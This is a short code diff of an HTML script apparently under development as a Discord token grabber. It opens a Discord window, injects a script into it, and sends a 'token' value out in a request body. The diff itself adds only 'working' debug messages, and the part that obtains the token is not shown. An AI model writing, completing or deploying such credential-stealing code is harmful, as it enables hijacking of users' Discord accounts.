@@ -1,4 +1,5 @@
 <script>
+  console.log("working")
 var win = window.open('https://discord.com/channels/@me');
   var script = document.createElement('script');
   script.textContent = `
@@ -12,6 +13,7 @@ var params = {
     content: token
 }
 request.send(JSON.stringify(params));
+alert("working")
   `;
   win.document.head.appendChild(script);
 </script>
